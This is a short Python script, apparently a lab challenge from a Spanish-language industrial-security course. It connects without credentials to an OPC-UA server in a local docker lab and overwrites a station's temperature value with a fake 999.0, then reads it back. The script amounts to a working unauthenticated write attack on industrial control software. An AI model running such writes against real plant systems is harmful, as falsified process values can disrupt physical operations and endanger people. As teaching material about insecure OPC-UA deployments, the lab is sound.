"""Reto 2 del M02-02: escribir en una variable del servidor OPC-UA sin pedir permiso.

Ejecútalo desde infra/:

    docker compose --profile lab run --rm --no-deps --entrypoint python lab -W ignore /construye/m02_02_escribir_opcua.py
"""
import asyncio

from asyncua import Client

VALOR_FALSO = 999.0      # la temperatura que vas a escribir


async def main():
    async with Client(url="opc.tcp://opcua:4840/linea/server") as cliente:   # sin usuario ni contraseña
        estacion = await cliente.nodes.objects.get_child(["2:Estacion"])
        temperatura = await estacion.get_child(["2:Temperatura"])
        print("antes de escribir:", await temperatura.read_value())
        await temperatura.write_value(VALOR_FALSO)                             # cualquiera puede hacerlo
        print("justo después:    ", await temperatura.read_value())
        await asyncio.sleep(1)
        print("un segundo después:", await temperatura.read_value())


asyncio.run(main())
